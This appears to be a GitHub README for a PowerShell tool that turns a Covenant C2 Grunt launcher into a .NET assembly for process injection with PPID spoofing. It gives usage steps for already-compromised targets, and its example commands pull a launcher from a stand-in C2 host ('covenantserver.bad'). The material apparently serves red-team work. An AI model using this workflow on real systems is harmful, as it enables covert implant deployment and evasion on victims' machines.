# Generate-GruntInjector

A PowerShell script that turns a Covenant Grunt launcher into a .NET assembly that can be coupled with Covenant's `Assembly` command to achieve process injection in Covenant.

## Installation / Getting started

The script relies on [Donut](https://github.com/TheWover/donut) to convert the Grunt launcher .NET assembly into shellcode. Follow their installation and compilation instructions and ensure `donut.exe` is either in your PATH or note its path.

Clone this repository.

```shell
git clone https://github.com/tgihf/covenant-grunt-injection.git
```

The script uses `csc` to compile the Grunt injector which is executed on the target machine. If you'll be targeting machines that only have .NET 3.5 installed, make sure you have .NET 3.5 and its `csc.exe` installed. If you'll be targeting machines that only have .NET 4.0 installed, make sure you have .NET 4.0 and its `csc.exe` installed. For best results, just install both!

## Usage

> Scenario: you have a functional Grunt on a target machine and want to inject a Grunt into another process.

Host a Binary Launcher. Note the .NET Framework Version. 

![](gif/host-binary-launcher.gif)

Run `Generate-GruntInjector` with the URL the Binary Launcher is hosted on, the path to `donut.exe`, and the .NET Framework version the Binary Launcher is compiled against.

![](gif/generate-grunt-injector.gif)

This produces a Grunt injector, which by default is named `GruntInjector_<timestamp>_v<.NET Framework version>.exe`. This .NET assembly injects a Grunt into an new, arbitrary process with an arbitrary PPID. Details on the process injection technique used can be found in the **Links** section of this README.

Check which processes are running on the target with your functional Grunt. I'll be using the PID of this `powershell.exe` process as my PPID.

![](gif/examine-processes.gif)
  
Navigate to your functional Grunt's `Task` page and select the `Assembly` task.

Give it an arbitrary `AssemblyName`.

Set the `EncodedAssembly` parameter to your new Grunt injector.

For the `Parameters` parameter, give it the full path of the executable you'd like to inject into and the PPID you'd like to spoof.

![](gif/grunt-injection.gif)

Click `Task` and profit!

![](gif/confirm-injection.gif)

### Arguments
#### LauncherURL
Type: `String`  

URL of the Grunt binary launcher hosted on your Covenant server. It will be downloaded from the Covenant server and inserted into the injection assembly. 

```cmd
Generate-GruntInjector.ps1 -LauncherURL https://covenantserver.bad/woo
```

#### InputFile
Type: `String`

Full path to the Grunt binary launcher on disk. It will be read and inserted into the injection assembly.

```cmd
Generate-GruntInjector.ps1 -InputFile C:\Users\covenant\Desktop\launcher.exe
```

#### DotNetFrameworkVersion
Type: `Float`

Options: `3.5` or `4.0`

Default: `4.0`

Specifies which version of the .NET Framework to compile the injection assembly against. 

**IMPORTANT**: This should match the .NET Framework version that the original Grunt binary launcher was compiled against. You can view and modify this on the Launcher > Binary page. You must have which ever version you choose installed on your machine.

```cmd
Generate-GruntInjector.ps1 -LauncherURL https://covenantserver.bad/woo -DotNetFrameworkVersion 3.5
```

#### DonutPath
Type: `String`

Default: `"donut.exe"`

Full path to donut.exe. Installation instructions found [here](https://github.com/TheWover/donut).

```cmd
Generate-GruntInjector.ps1 -LauncherURL https://covenantserver.bad/woo -DonutPath C:\Users\covenant\Desktop\donut\donut.exe
```

#### Outfile
Type: `String`

Default: `"GruntInjector_<timestamp>_v<.NET Framework version>.exe"`

Full path to write the injector assembly to.

```cmd
Generate-GruntInjector.ps1 -LauncherURL https://covenantserver.bad/woo -Outfile C:\Users\covenant\Desktop\covenant\injector.exe
```

## Links

This project is merely an automation of [Rasta Mouse's](https://rastamouse.me) [Covenant/Donut process injection technique](https://rastamouse.me/2019/08/covenant-donut-tikitorch/). All creds to him for doing the heavy thinking! His technique for process injection involves unmanaged calls to `CreateProcess`, `InitializeProcThreadAttributeList`, `UpdateProcThreadAttribute`, `DeleteProcThreadAttributeList`, `VirtualAllocEx`, `WriteProcessMemory`, `VirtualAllocEx`, and `CreateRemoteThread`. The C# source code for the injector is embedded within Generate-GruntInjector and can be found in Rasta Mouse's blog post above.

The project relies heavily on [Donut](https://github.com/TheWover/donut), a phenomenal project that allows us to convert the Grunt launcher .NET assembly into position-independent shellcode. Thank you, [TheWover](https://thewover.github.io) and [Odzhan](https://modexp.wordpress.com)!

This project is a helper tool for [Cobbr's](https://cobbr.io) [Covenant](https://github.com/cobbr/Covenant). Thanks for pioneering such a great project!

## Licensing

The code in this project is licensed under MIT license.
